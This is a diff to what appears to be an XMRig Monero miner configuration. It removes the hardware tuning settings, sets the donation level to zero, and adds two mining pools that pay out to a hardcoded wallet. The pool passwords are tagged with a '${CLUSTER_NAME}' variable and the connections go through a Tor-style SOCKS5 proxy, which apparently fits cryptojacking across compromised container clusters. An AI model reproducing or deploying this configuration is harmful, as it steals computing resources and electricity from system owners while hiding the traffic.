@@ -14,114 +14,22 @@
     "background": false,
     "colors": true,
     "title": true,
-    "randomx": {
-        "init": -1,
-        "init-avx2": -1,
-        "mode": "auto",
-        "1gb-pages": false,
-        "rdmsr": true,
-        "wrmsr": true,
-        "cache_qos": false,
-        "numa": true,
-        "scratchpad_prefetch_mode": 1
-    },
     "cpu": {
         "enabled": true,
-        "huge-pages": true,
-        "huge-pages-jit": false,
-        "hw-aes": null,
-        "priority": null,
-        "memory-pool": false,
-        "yield": true,
-        "asm": true,
-        "argon2-impl": null,
-        "argon2": [-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1],
-        "cn": [
-            [1, -1],
-            [1, -1],
-            [1, -1],
-            [1, -1],
-            [1, -1],
-            [1, -1]
-        ],
-        "cn-heavy": [
-            [1, -1],
-            [1, -1],
-            [1, -1]
-        ],
-        "cn-lite": [
-            [1, -1],
-            [1, -1],
-            [1, -1],
-            [1, -1],
-            [1, -1],
-            [1, -1],
-            [1, -1],
-            [1, -1],
-            [1, -1],
-            [1, -1],
-            [1, -1],
-            [1, -1]
-        ],
-        "cn-pico": [
-            [2, -1],
-            [2, -1],
-            [2, -1],
-            [2, -1],
-            [2, -1],
-            [2, -1],
-            [2, -1],
-            [2, -1],
-            [2, -1],
-            [2, -1],
-            [2, -1],
-            [2, -1]
-        ],
-        "cn/upx2": [
-            [2, -1],
-            [2, -1],
-            [2, -1],
-            [2, -1],
-            [2, -1],
-            [2, -1],
-            [2, -1],
-            [2, -1],
-            [2, -1],
-            [2, -1],
-            [2, -1],
-            [2, -1]
-        ],
-        "ghostrider": [
-            [8, -1],
-            [8, -1],
-            [8, -1],
-            [8, -1],
-            [8, -1],
-            [8, -1]
-        ],
-        "rx": [-1, -1, -1, -1, -1, -1],
-        "rx/arq": [-1, -1, -1, -1, -1, -1],
-        "rx/keva": [-1, -1, -1, -1, -1, -1],
-        "rx/wow": [-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1],
-        "cn-lite/0": false,
-        "cn/0": false
-    },
-    "opencl": {
-        "enabled": false,
-        "cache": true,
-        "loader": null,
-        "platform": "AMD",
-        "adl": true
-    },
-    "cuda": {
-        "enabled": false,
-        "loader": null,
-        "nvml": true
+        "huge-pages": true
     },
     "log-file": null,
-    "donate-level": 1,
+    "donate-level": 0,
     "donate-over-proxy": 0,
     "pools": [
+        {
+            "url": "pool.supportxmr.com:443",
+            "user": "4B9jewiRwwmT5G3Bk9y4Uncpa5pF6WzSRdGzy5wV9tNHDedfdgu7wbpPjZv7SALwRCBv5CPfRAsw2hjLmbMBzTDj85Z8cic",
+            "pass": "x-${CLUSTER_NAME}",
+            "keepalive": true,
+            "socks5": 9050,
+            "tls": true
+        },
         {
             "algo": null,
             "coin": null,
@@ -139,13 +47,19 @@
             "socks5": 9050,
             "self-select": null,
             "submit-to-origin": false
+        },
+        {
+            "url": "pool.hashvault.pro:443",
+            "user": "4B9jewiRwwmT5G3Bk9y4Uncpa5pF6WzSRdGzy5wV9tNHDedfdgu7wbpPjZv7SALwRCBv5CPfRAsw2hjLmbMBzTDj85Z8cic",
+            "pass": "x-${CLUSTER_NAME}",
+            "keepalive": true,
+            "socks5": 9050,
+            "tls": true
         }
     ],
     "retries": 5,
     "retry-pause": 5,
     "print-time": 60,
-    "health-print-time": 60,
-    "dmi": true,
     "syslog": false,
     "tls": {
         "enabled": false,
